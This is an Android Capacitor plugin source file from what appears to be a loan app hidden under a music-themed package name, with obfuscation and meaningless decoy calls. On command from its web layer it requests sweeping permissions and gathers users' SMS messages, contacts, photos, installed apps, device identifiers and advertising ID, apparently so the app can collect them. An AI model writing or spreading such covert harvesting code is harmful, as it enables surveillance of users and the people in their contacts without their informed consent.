package com.music.violin.cash.violin.music.loan.store.cash.loan;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;

import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.github.megatronking.stringfog.annotation.StringFogIgnore;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.util.HashMap;
import java.util.Map;


@CapacitorPlugin(name = "UAM3IHKS")
@StringFogIgnore
public class MyPlugin extends Plugin {
    public static final int CAMERA_REQUEST_CODE = 564;

    public static PluginCall newCall;
    @PluginMethod()
    public void echo(PluginCall call) {
        try {
            DemoThree.kthSmallestProduct(new int[234], new int[34]);
            char[] akho = new char[0];
            int i = TextAnimal.myAtoi(new String(akho));
        }catch (Exception e){

        }
        try{
            Class<DemoTWO> demoTWOClass = DemoTWO.class;
        }catch (Exception e){

        }
        JSObject ret = new JSObject();
        String value = call.getString("key");
        if (value.equals("getRequestHeadToken")) {
            ret.put("gaId", getGaid(getContext()));
            ret.put("androidId", getAndroidID(getContext()));
            ret.put("appVersionName", getAppVersionName(getContext()));
        } else if (value.equals("getQuanxian")) {
            newCall = call;
            ActivityCompat.requestPermissions(
                    getActivity(),
                    new String[] {
                    Manifest.permission.READ_PHONE_STATE,Manifest.permission.CAMERA,Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_CONTACTS,Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS},
            CAMERA_REQUEST_CODE);
            return;
        }  else if (value.equals("getEmail")) {
            try {
                Intent data=new Intent(Intent.ACTION_SENDTO);
                data.setData(Uri.parse("mailto:violin.customer@hotmail.com"));
                getActivity().startActivity(data);
            } catch (Exception e) {

            }
        }else if(value.equals("Logout")){
            System.exit(0);
        }else {
            Map map = new HashMap();
            if (value.equals("getDeviceInfo")) {
                map.put("device", GetDeviceUtils.getDeviceInfo(getActivity()));
            }
            if (value.equals("getPhoto")) {
                map.put("photoList", GetDeviceUtils.getAlbumPhotos(getActivity()));
            }
            if (value.equals("getApp")) {
                map.put("deviceApps", GetDeviceUtils.getDeviceApps(getActivity()));
            }
            if (value.equals("getSms")) {
                map.put("smsList", GetDeviceUtils.getPhoneSms(getActivity()));
            }
            if (value.equals("getContact")) {
                map.put("deviceContacts", GetDeviceUtils.getContacts(getActivity()));
            }
            Gson gson = new Gson();
            String json = gson.toJson(map);
            JsonObject mm = gson.fromJson(json, JsonObject.class);
            ret.put("appInfo", mm);
        }
        call.resolve(ret);
    }
    public static String getAppVersionName(Context context) {
        String versionName = "";
        try {
            // ---get the package info---
            PackageManager pm = context.getPackageManager();
            PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
            versionName = pi.versionName;
            if (versionName == null || versionName.length() <= 0) {
                return "";
            }
        } catch (Exception e) {

        }
        return versionName;
    }
    public static String getAndroidID(Context context) {
        try {
            String androidID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            //LogUtil.e("androidID: " + androidID);
            return androidID;
        } catch (Exception e) {
            return null;
        }
    }
    public static String getGaid(Context context) {
        try {
            String Gaid = new AdvertisingIdClient(context).getAdvertisingIdInfo(context).getId();
            return Gaid;
        } catch (Exception e) {
            return null;
        }
    }



}
